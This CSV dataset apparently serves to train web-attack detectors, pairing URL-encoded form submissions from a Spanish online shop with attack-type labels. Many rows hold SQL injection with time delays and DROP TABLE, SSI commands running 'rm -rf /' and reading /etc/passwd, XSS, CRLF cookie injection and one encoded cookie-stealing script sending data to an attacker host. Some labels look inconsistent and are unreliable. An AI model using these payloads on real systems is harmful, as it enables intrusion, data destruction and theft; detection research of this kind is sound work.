payload,attack_type,label
modo=insertar&precio=5191&B1=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
errorMsg=Credenciales+incorrectas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,sqli,1
modo=registro&login=whinnery&password=encabar&nombre=Sabiela&apellidos=Royo+Mascarell&email=cane%40meneamex.br&dni=60106679C&direccion=Calle+Biznaga%2C+5+&ciudad=Velilla+de+Cinca&cp=15124&provincia=Santa+Cruz+de+Tenerife&ntc=6795968081758370&B1=Registrar,normal,0
idA=2123,normal,1
modo=registro&login=jolitz&password=remend%F3n&nombre=Helios&apellidos=Tolaba+Raez&email=sachnovsky%40surcosur.cx&dni=98404779S%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&direccion=Calle+Estacion+Depuradora+Santa+Catalina%2C+32+&ciudad=Navaluenga&cp=09348&provincia=Salamanca&ntc=0341678855610111&B1=Registrar123,sqli,1
modo=insertar&precio=634&B1=Confirmar%2F,cmdi,1
modo=insertar&precio=2925&B1=Pasar+por+caja,normal,0
modo=insertar&precio=6918&B1=Pasar+por+caja123,normal,0
id=3&nombre=Jam%F3n+Ib%E9ricoparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=39&cantidad=4&B1=A%F1adir+al+carrito123,xss,1
modo=registro&login=rist&password=ti20&nombre=rey&apellidos=ribera+vitol%e1s&email=halstan%40guerrerodelbienestar.sh&dni=85804612f&direccion=enparantza+concordia+47%2c+&ciudad=for%e8s&cp=04420&provincia=valladolid&ntc=7823647161649083&b1=registrar,normal,0
modo=registro&login=eastreg&password=impla6ica1le&nombre=Carmen&apellidos=Huarip.a_t.a&email=dufresne%40mauvier.hk&dni=51243773A&direccion=Calle+Perla%2C+71+&ciudad=Villalbilla&cp=45594&provincia=Le%F3n&ntc=7784731967679465&B1=Registrar,cmdi,1
id=2&nombre=Queso+Manchego&precio=100%2F&cantidad=28&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=chinhany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&pwd=clavadura&remember=off&B1=Entrar,cmdi,1
errorMsg=Credenciales+incorrectas123,normal,0
modoA=insertar&precio=810&B1=Confirmar,cmdi,1
B2=Vaciar+carrito,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=rickie&password=techumbre&nombre=yazm%edn&apellidos=aul%ed&email=wilton7%40weat.ic&dni=86273903y&direccion=calle+teniente+bragado+139+7%3fe&ciudad=sant+juli%e0+del+llor+i+bonmat%ed&cp=43426&provincia=guadalajara&ntc=3817112988880158&b1=registrar,normal,0
modo=insertar&precio=9253&B1=Pasar+por+caja,normal,0
errorMsg=%257C123,normal,1
modoA=entrar&login=apollo&pwd=hepta8qu%EDa&remember=off&B1=Entrar,cmdi,1
idA=1,normal,1
id=any%253f%250aset-cookie%253a%2btamper%253d5765205567234876235,normal,1
modo=insertar&precio=401&B1=Confirmar%2F,cmdi,1
modo=entrar&login=saskia&pwd=revivificaci%F3n&remember=on&B1=Entrar,normal,0
modo=insertar&precio=4337&b1=pasar+por+caja,normal,0
errormsg=credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
ida=2,normal,1
modo=entrar&login=knio&pwd=tricentenario&remember=off&B1=Entrar,normal,0
ERRORmSG=cREDENCIALES+INCORRECTAS%27%3b+drop+table+USUARIOS%3b+select+*+from+DATOS+where+NOMBRE+like+%27%25,sqli,1
modo=registro&login=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&password=contrAamura&nombre=Nicasia&apellidos=Coyoma+Abia&email=padovani%40thequeenworm.mp&dni=78419891B&direccion=Avenida+Castilla-la+Mancha+187%2C+3-D&ciudad=Sagrada%2C+La&cp=09318&provincia=A+Coru%F1a&ntc=4808153993761167&B1=Registrar,sqli,1
modo=entrar&login=chunyen&pwd=inconSTItUcIONaL&remember=on&B1=Entrar,normal,0
modo=registro&login=hewitt&password=esc2n3alosa5e4te&nombre=ezio&apellidos=llompart+delb%f3n&email=moloney%40imarbella.travel&dni=79024359q&direccion=calle+paz%2c+s%2fn+&ciudad=pinar%2c+el&cp=50174&provincia=%c1lava&ntc=3891909303541723&b1=registrar,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=insertar&precio=1517&B1=AND+1%3D1,cmdi,1
modo=insertar&precio=5107&B1=Pasar+por+caja,normal,0
modo=entrar&login=kalila&pwd=47gent1R&remember=off&B1=Entrar123,normal,0
id=%257c,normal,1
modo=entrar&login=alfi&pwd=6ncanta33%F3n&remember=on&B1=Entrar,normal,0
MODO=ENTRAR&LOGIN=PAGI&PWD=REFR2ND0&REMEMBER=OFF%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&b1=eNTRAR,sqli,1
id=2,normal,0
modo=registro&login=shahab&password=re6lexi%F3n&nombre=Efra%EDn&apellidos=Nicol%E0s&email=burbidge%40elalamorestaurante.pr&dni=76914964C&direccion=Plaza+Fontana%2C+78%2C+&ciudad=Clariana+de+Cardener&cp=49622&provincia=Palencia&ntc=1563947873431208&B1=Registrar,normal,0
modo=entrar&login=vreugden&pwd=desmerecer&remember=off&B1=Entrar,normal,0
modo=entrar&login=hately6&pwd=luJURiosaMente&remember=on%2F&B1=Entrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
id=3&nombre=Vino+Rioja&precio=39&cantidad=35&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=chartran&pwd=sapillo&remember=on%2F&B1=Entrar,cmdi,1
modo=registro&login=kalil&password=c0M51ar&nombre=Avelino&apellidos=Westermeier&email=sutorius.sambeek%40apicultor.mil&dni=24331853S&direccion=Calle+Relleu+159+&ciudad=Alberite+de+San+Juan&cp=05292&provincia=Cuenca&ntc=4551401932172135&B1=Registrar,normal,0
idA=2,normal,1
modo=registro&login=ivanyi0&password=va7e9ianato&nombre=Crescencio&apellidos=Echevarr%EDa+Borras&email=tadio.bixby%40espaciopintor.eh&dni=98763423C&direccion=Torrent+De+Can+Quintana%2C+179%2C+&ciudad=Llocnou+de+la+Corona&cp=49430%2B&provincia=Lleida&ntc=8110791105529474&B1=Registrar,cmdi,1
modo=entrar&login=gater9&pwd=c356conio&remember=off&B1=Entrar,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
B2=Vaciar+carrito,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=10&B1=A%F1adir+al+carrito,normal,0
id=1%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=registro&login=nitin&password=r4mitir&nombre=Lionel&apellidos=Teixidor+Modrego&email=creach%40vindexexpo.gr&dni=37118814B&direccion=C%2F+Joaquin+Arjona+70%2C+&ciudad=Rionegro+del+Puente&cp=49639&provincia=Barcelona&ntc=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Registrar123,sqli,1
id=2123,normal,0
modo=registro&login=keer&password=gala&nombre=Amarili&apellidos=Misut+Fondevi&email=waggenheim%40rubirubi.info&dni=55265136T&direccion=C%2F+General+Merry+Del+Val%2C+S%2FN+&ciudad=Viso+de+San+Juan%2C+El&cp=45674&provincia=Teruel&ntc=2996877022240469&B1=Registrar,normal,0
modo=insertar&precio=8653&B1=Confirmar,normal,0
modo=registro&login=karyl&password=s16nio5o&nombre=Tiziano&apellidos=Mugione+De+Manuel&email=solonitsin3%40neotelecom.fi&dni=89388462C&direccion=Terque+135%2C+7-C&ciudad=Montroy&cp=22193&provincia=Guadalajara&ntc=7215089345042859&B1=Registrar,normal,0
modo=entrar&login=watanabe&pwd=c39ine8ra&remember=off&B1=Entrar123,normal,0
modo=entrar&login=dar-dersessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&pwd=caser%EDa&remember=on&B1=Entrar,cmdi,1
modo=registro&login=ivette&password=9oT87iCo&nombre=Pascualino&apellidos=Ubieta&email=keng%40glutenfreespain.lb&dni=02723270R&direccion=Pasaje+Cesar+Arbasia%2C+99%2C+3-A&ciudad=Llanera&cp=28660&provincia=Valencia&ntc=0212404020033772&B1=Registrar,normal,0
id=2,normal,0
modo=insertar&precio=9510&B1=Confirmar%2F,cmdi,1
modo=entrar&loginA=soucie6&pwd=3fistol23&remember=on&B1=Entrar,cmdi,1
modo=registro&login=coxall&password=9errero&nombre=Vilma&apellidos=Bayter+Bertinelli&email=kwah-wu%40921.cf&dniA=38682401N&direccion=Calle+Francisco+Altimiras%2C+154+&ciudad=Muros+de+Nal%F3n&cp=10840&provincia=Burgos&ntc=2744860732185534&B1=Registrar,cmdi,1
B2=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
b2=vACIAR+CARRITO%3c%21--%23EXEC+CMD%3d%22RM+-RF+%2f%3bCAT+%2fETC%2fPASSWD%22+--%3e,sqli,1
modo=entrar&login=merriell&pwd=adapuesto&remember=on&b1=entrar,normal,0
B2=Vaciar+carrito%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=registro&login=hinkel&password=recur23bl6&nombre=Alejo&apellidos=Pirla&email=plommer8%40artesania.org.sj&dni=22063837Y&direccion=C%2F+Fancelli%2C+34+6B&ciudad=Valverde+de+Alcal%E1&cp=09146&provincia=Ourense&ntc=5170844676174994&B1=Registrar,normal,0
modo=registro&login=mobasher&password=pa32885o&nombre=Noel+Stefani&apellidos=Zulueta+Amell&email=deschamps1%4011horas.my&dni=51756068L&direccion=Calle+Jerusalen+18+&ciudad=Santib%E1%F1ez+de+Valcorba&cp=%3F&provincia=Almer%EDa&ntc=9542215186041042&B1=Registrar,cmdi,1
modo=registro&login=fedoruk&password=l8ci7ic55&nombre=genoveva&apellidos=barker+ropero&email=arness%40pastahut.ga&dni=02054707w&direccion=alcalde+manuel+de+la+pinta+s%2fn+13%3ff&ciudad=laguna+de+cameros&cp=47670&provincia=salamanca&ntc=3270734525112576&b1=registrar,normal,0
modo=entrar&login=ursala&pwd=plu1bagin%e1%21ceo&remember=off&b1=entrar,normal,0
modoA=registro&login=keene-mo&password=DEs2l0bear&nombre=Florio&apellidos=Alcalde+Rybensky&email=bobenko-steimaroua%40926.lb&dni=65834957X&direccion=C%2F+Leganes%2C+74+&ciudad=Sant+Miquel+de+Campmajor&cp=42138&provincia=Huesca&ntc=7967092459392219&B1=Registrar,cmdi,1
modo=insertar&precio=8673&b1=pasar+por+caja,normal,0
id=3&nombre=Queso+Manchego&precio=39&cantidad=67&B1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E123,sqli,1
errorMsgA=Credenciales+incorrectas,normal,1
ID=1&NOMBRE=vINO+rIOJA&PRECIO=85&CANTIDAD=31&b1=a%f1ADIR+AL+CARRITO%3c%21--%23exec+CMD%3d%22LS+%2f%22--%3e,sqli,1
modo=registro&login=horatio&password=B%C1l%21tEo&nombre=Noem%ED&apellidos=Ponsati+Puratic&email=vladimirov%40saludyfitness.br&dni=31358386W&direccion=Burgos%2C+40%2C+7%3FA&ciudad=Geria&cp=18347&provincia=Valladolid&ntc=6368525574749403&B1=Registrar,normal,0
modo=insertar&precio=9853&B1=Pasar+por+caja%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=entrar&login=alexine&pwd=1n154c3602&remember=on&B1=Entrar,normal,0
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=56&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=hungkang&password=desligar&nombre=Ceferina&apellidos=Guasch+Xifr%E9&email=jo-allen%40engibraltar.zr&dni=38626822R&direccion=C%2F+La+Hortensia%2C+S%2FN+&ciudad=Campos+del+Para%EDso&cp=02124&provincia=Valladolid&ntc=5728310223960582&B1=Registrar123,normal,0
errorMsgA=Credenciales+incorrectas123,normal,1
modo=insertar&precio=2161&b1=pasar+por+caja,normal,0
id=3&nombre=Vino+Rioja&precio=100&cantidad=14&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=arco&password=b74RerA&nombre=Agueda&apellidos=Sauri+Sanaspleda&email=gozzi%40encuentrodominios.at&dni=57154114B&direccion=Calle+Medellin+188%2C+3E&ciudad=H%2Ferram%E9lluri&cp=26360&provincia=C%E1ceres&ntc=6165671894107883&B1=Registrar,cmdi,1
errorMsg=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,xss,1
modo=registro&login=bradney4&password=t31331&nombre=anuar&apellidos=retuerta+fong&email=strucak%40cortell.cat&dni=65651817l&direccion=poblado+de+regulares+180%2c+1d&ciudad=castro+de+rei&cp=05659&provincia=lleida&ntc=6974700055894599&b1=registrar,normal,0
id=2,normal,0
id=%2b,normal,1
modo=insertar&precio=9173&B1=Confirmar,normal,0
b2=%3f,normal,1
modo=insertar&precio=1948&B1=Confirmar123,normal,0
id=1&nombreA=Queso+Manchego&precio=39&cantidad=74&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=gonzaga&password=ACoNtecIMIENTO&nombre=Redenta&apellidos=Libano+Parramon&email=vigran%40maletti.cy&dni=24320656L&direccion=Calle+Tagarnina%2C+120%2C+13C&ciudad=Roca+del+Vall%E8s%2C+La&cp=10748&provincia=Castell%F3nany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&ntc=6815796601581594&B1=Registrar,cmdi,1
modo=registro&login=crozier&password=aborrecimiento&nombre=Abig*ail&apellidos=Burch+Echaniz&email=hyer_longdon0%40artforall.mc&dni=62804007T&direccion=Plza.+Troyano+Salaverry%2C+42%2C+&ciudad=Ch%F3var&cp=30500&provincia=Le%F3n&ntc=1229899553268508&B1=Registrar,cmdi,1
id=1,normal,0
modo=entrar&loginA=rajchwal&pwd=caLabrotar&remember=on&B1=Entrar,cmdi,1
modo=entrar&login=arles&pwd=15Ma0dE9o&remember=on&B1=Entrar123,normal,0
id=3&nombreA=Jam%F3n+Ib%E9rico&precio=100&cantidad=63&B1=A%F1adir+al+carrito,cmdi,1
id=1%22+AND+%221%22%3D%221,normal,1
idA=2,normal,1
B2A=Vaciar+carrito,normal,1
modo=entrar&login=heeralal0&pwd=mi%F1arse&remember=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Entrar,xss,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=jdavie&password=Set-cookie%253A%2BTamper%253D1041264011025374727&nombre=Ram&apellidos=Pieres+Marrett&email=anutchitcharnchai%40informatica2009.ec&dni=76610505N&direccion=Juan+Martel+18%2C+8%3FH&ciudad=Buenavista+del+Norte&cp=08612&provincia=Guadalajara&ntc=0010509413049118&B1=Registrar,cmdi,1
modo=insertar&precio=8032&B1=Pasar+por+caja,normal,0
modo=insertar&precio=9041&B1=Confirmar,normal,0
modo=registro&login=haylock&password=zANgaRulL%D3N&nombre=A%2Fm%2Fi%3Fr&apellidos=Acevedo+Cantonati&email=kuzuoglu5%40nomao.iq&dni=43751597P&direccion=C%2F+Maria+Moliner+48+&ciudad=Ojos+Negros&cp=10160&provincia=Salamanca&ntc=0358024000873525&B1=Registrar,cmdi,1
modo=registro&login=wai&passwordA=venecianO&nombre=Esdras&apellidos=Alabart&email=dudicourt%40viajessolomujeres.travel&dni=28316047B&direccion=Motril%2C+128+&ciudad=A%F1e&cp=40330&provincia=Guadalajara&ntc=0070151205403865&B1=Registrar,cmdi,1
modo=insertar&precio=586&B1=Confirmar,normal,0
modo=registro&login=jwahar&password=perfecci%F3n&nombre=Anan%EDas&apellidos=Manzano+Babot&email=couri-manahan%40copiar.com.fm&dni=72622550G&direccion=Josep+Pallch+i+Carola%2C+199%2C+4-E&ciudad=Mandayona&cp=09124&provincia=Salamanca&ntc=6135978760612674&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=3&nombre=Vino+Rioja&precio=100&cantidadA=36&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=meera&password=boquitue87a&nombre=Safo&apellidos=Koolmees+Moliner&email=nomis%40wormee.is&dni=13403604D&direccion=Glorieta%2B+D%2Be+Antonio+Machado%2C+18*3+8%3FE&ciudad=Sol%F3rzano&cp=04212&provincia=Burgos&ntc=5498057012879468&B1=Registrar,cmdi,1
id=2&nombre=Vino+Rioja&precio=39&cantidad=69&B1=A%F1adir+al+carritoany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,cmdi,1
id=2&nombre=queso+manchego&precio=39&cantidad=80&b1=a%f1adir+al+carrito,normal,0
modo=insertar&precio=1820&B1=Confirmar,normal,0
modo=registro&login=grevelin&password=sendere%24a2&nombre=yamilem&apellidos=llers+marquile&email=dudas%40google-movil.np&dni=18041890t&direccion=praza+pascasio+fernandez+seguin%2c+73%2c+&ciudad=tornadizo%2c+el&cp=03520&provincia=ja%e9n&ntc=6193259075510468&b1=registrar,normal,0
ERRORmSG=PAROS%2522%2bSTYLE%253d%2522BACKGROUND%253aURL%2528JAVASCRIPT%253aALERT%2528%2527pAROS%2527%2529%2529%26ID%3d2,xss,1
modo=insertar&precio=8201&B1=Pasar+por+caja,normal,0
B2=Vaciar+carrito,normal,0
modo=entrar&login=de_anda&pwd=fauno&remember=off&B1=Entrar,normal,0
id=1,normal,0
ID=1&NOMBRE=%3c%21--%23INCLUDE+FILE%3d%22ARCHIVO_SECRETO%22+--%3e&PRECIO=85&CANTIDAD=22&b1=a%f1ADIR+AL+CARRITO,sqli,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=entrar&login=hengevel&pwd=guabo&remember=on&B1=Entrar,normal,0
id=2%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
id=2,normal,0
modo=registro&login=mccarron&passwordA=revistero&nombre=Adelqui&apellidos=Valente+Sanchis&email=gargen%40007tv.zw&dni=83296238J&direccion=C%2F+Fuente+Morena%2C+146%2C+&ciudad=Rillo&cp=17752&provincia=Lleida&ntc=3359754319393302&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
MODO=REGISTRO&LOGIN=DIDO&PASSWORD=ENMARCH3TAR&NOMBRE=bERTILDA&APELLIDOS=dEVERDUN&EMAIL=LOW.FELICIANO%40AZKARA.SJ&DNI=19110618x&DIRECCION=pROLONGACION+aLGECIRAS+169%2c+&CIUDAD=nAVARREDONDA+DE+gREDOS&CP=18418&PROVINCIA=nAVARRA&NTC=1628195660765454&b1=%27%3b+drop+table+USUARIOS%3b+select+*+from+DATOS+where+NOMBRE+like+%27%25,sqli,1
B2=Vaciar+carrito123,normal,0
id=2,normal,0
modo=entrar&login=gaile&pwd=escam%F3n&remember=off&B1=Entrar,normal,0
modo=registro&login=linas&password=ceRd24a&nombre=Eranio&apellidos=Cus%F3+Motj%E9&email=twist.dangerfield%40beltoan.com.ne&dni=90907663W&direccion=Once+S%2FN+&ciudad=Ol%EDas+del+Rey&cp=37219&provincia=Lleida&ntc=6481855129498664&B1=Registrar123,normal,0
id=2&nombre=Queso+Manchego&precio=85&cantidad=14&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=mandruso&pwd=90r2L&remember=off&B1=Entrar123,normal,0
modo=insertar&precioA=9499&B1=Confirmar,cmdi,1
modo=insertar&precioA=1216&B1=Pasar+por+caja,cmdi,1
modo=registro&login=whited&password=coyotera&nombre=Noaldo&apellidos=Tranwincky+Selman&email=griem%40bloger%F3tico.nz&dniA=28828668P&direccion=Zenobia%2C+197+8G&ciudad=Cabra+del+Camp&cp=15350&provincia=Valencia&ntc=3322562441567993&B1=Registrar,cmdi,1
modo=registro&login=kirfman&password=7j2m%2Foren%27%2Fa&nombre=Nemesia&apellidos=Granyena+Hijodalgo&email=gandett%40cajucar.az&dni=93202432S&direccion=C%2F+Estambul%2C+162+3-G&ciudad=Riello&cp=42165&provincia=Teruel&ntc=2770286636013280&B1=Registrar,cmdi,1
modo=insertar&precio=7092&B1=Confirmarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,cmdi,1
B2=Vaciar+carrito,normal,0
id=2&nombre=Queso+Manchego&precio=39&cantidad=56&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=munaz&password=s2ld54i5a&nombre=Zulma&apellidos=Llombart&email=strimpell%40deuxmanagement.sn&dni=A0745780M&direccion=Sofia%2C+60%2C+3%3FB&ciudad=Finestrat&cp=01427&provincia=Granada&ntc=3222655347075896&B1=Registrar,cmdi,1
ID=2&NOMBRE=qUESO+mANCHEGO&PRECIO=100&CANTIDAD=64&b1=a%f1ADIR+AL+CARRITO%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modo=registro&login=kerlovic&password=6e665a&nombre=shazm%ednn&apellidos=aranceta+alameda&email=adlard%40muebemiweb.ke&dni=95843081b&direccion=cuesta+sal%2c+171%2c+5%3fa&ciudad=nogueruelas&cp=40352&provincia=navarra&ntc=8901603144998796&b1=registrar,normal,0
B2=Vaciar+carrito,normal,0
modo=entrar&login=bossa&pwd=ad8ma45ino&remember=off&B1=Entrar,normal,0
ID=%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&NOMBRE=qUESO+mANCHEGO&PRECIO=100&CANTIDAD=29&b1=a%f1ADIR+AL+CARRITO,sqli,1
modo=registro&login=yeo-hoon&password=eSpIlOc3o&nombre=Heldo&apellidos=Bernad+Fermoselle&email=brazzi%40cortell.gs&dni=15495714Q&direccion=Larrazabal%2C+S%2FN%2C+11-B&ciudad=Muriel+de+la+Fuente&cp=45800&provincia=Granada&ntc=8489461843085797&B1=Registrar,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=fergusso&password=depravador&nombre=Brigitte&apellidos=Verdugo+Olalla&email=bideau%40fulanitoymenganito.eh&dni=99997973E&direccion=Valencia%2C+79+12%3FH&ciudad=Narrillos+del+%C1lamo&cp=34239&provincia=M%E1laga&ntc=5564897923459190&B1=Registrar,normal,0
modo=registro&login=mcfarlan&password=bat3an&nombre=Odil%F3n&apellidos=Bassaga%F1a+Gifra&email=dannunzio.sugiura%40ilusionarium.sj&dni=14835707V&direccion=Entrada+Casas+90+&ciudad=Pelayos&cp=25265&provincia=Huesca&ntc=9431159156347522&B1=Registrar123,normal,0
modo=registro&login=lotfalia&password=prestancIa&nombreA=Dip&apellidos=Miravet+Leserre&email=bois%40awat.vi&dni=49100388B&direccion=C%2F+Maestro+Macias%2C+77%2C+3C&ciudad=Pe%F1as+de+San+Pedro&cp=46838&provincia=Lleida&ntc=8266692511685831&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=zander&password=arca%EDsta&nombre=Zain&apellidos=Espriella+Morcos&email=skala%40lamarsrl.la&dni=28264646S&direccion=Nardo%2C+106%2C+7-H&ciudad=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&cp=46315&provincia=Alicante&ntc=5436324330428646&B1=Registrar,sqli,1
modo=registro&login=silvie&password=metac%E9ntrico&nombre=Tel%E9sfora&apellidos=Pao+Villalobos&email=soldati%40legami.so&dni=96399738E&direccion=C%2F+Padre+Francisco+S%2FN%2C+&ciudad=Alfafara&cp=29380&provincia=La+Rioja&ntc=1246947052735749&B1=Registrar,normal,0
modo=insertar&precio=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=Pasar+por+caja123,sqli,1
modo=insertar&precio=795&B1=Pasar+por+caja%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=insertar&precio=9510&B1A=Confirmar,cmdi,1
B2A=Vaciar+carrito,normal,1
b2=vaciar+carrito,normal,0
modo=insertar&precio=8659&B1=Pasar+por+caja%2F,cmdi,1
modoA=insertar&precio=37&B1=Confirmar,cmdi,1
modo=registro&login=willie51&password=desintegrar&nombre=Cirio&apellidos=Junquera&email=desailly_bosworth%40coworkers.gov&dni=33273113W&direccion=Calle+Lujan+Perez+17%2C+&ciudad=Undu%E9s+de+Lerda&cp=45130&provincia=Valladolid&ntc=4102716313272060&B1=Registrar,normal,0
MODO=REGISTRO&LOGIN=HANTAK&PASSWORD=T82925R&NOMBRE=lIHUE&APELLIDOS=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e&EMAIL=HOLZSCHUH7%40SUPERLINKS.GA&DNI=60956471p&DIRECCION=fUENTERRABIA+130+2f&CIUDAD=pALACIOS+DE+sANABRIA&CP=48498&PROVINCIA=bARCELONA&NTC=6136393758401812&b1=rEGISTRAR,xss,1
id=2,normal,0
id=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,xss,1
B2=Vaciar+carritoSet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
modo=insertar&precio=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=Pasar+por+caja123,xss,1
modo=registro&login=jared&password=anunciador&nombre=Gisela&apellidos=Downs&email=azema.alvir%40telogis.gf&dni=72932222G&direccion=C%2F+Madrid%2C+53+5-F&ciudad=Aldehuela+de+Yeltes&cp=09247&provincia=Guadalajara&ntc=9385780627956523&B1=Registrar,normal,0
id=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=48&B1=A%F1adir+al+carrito123,sqli,1
id=3&nombre=vino+rioja&precio=100&cantidad=71&b1=a%f1adir+al+carrito,normal,0
id=2,normal,0
id=%27+DELETE+FROM+USERS123,normal,1
id=3&nombre=Ques%2Bo+Manchego&precio=85&cantidad=4&B1=A%F1adir+al+carrito,cmdi,1
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=mamie&password=mOnJA&nombre=Ecio&apellidos=Mendivil+Bellv%E9&email=wei%40alfombra.com.gw&dni=636A2860T&direccion=Calle+Galera+7%2C+&ciudad=Cordobilla+de+L%E1cara&cp=03720&provincia=Santa+Cruz+de+Tenerife&ntc=6649652935543559&B1=Registrar,cmdi,1
id=1&nombreA=Queso+Manchego&precio=100&cantidad=63&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=bat&password=escuda4&nombre=Casia&apellidos=Alert+Farreron&email=olarova%40ssextremadura.bg&dni=13843179P&direccion=C%2F+Doce+Martires+118+&ciudad=Oia&cpA=04531&provincia=Huelva&ntc=2507926371320953&B1=Registrar123,xss,1
ERRORmSG=cREDENCIALES+INCORRECTAS%27%3b+drop+table+USUARIOS%3b+select+*+from+DATOS+where+NOMBRE+like+%27%25,sqli,1
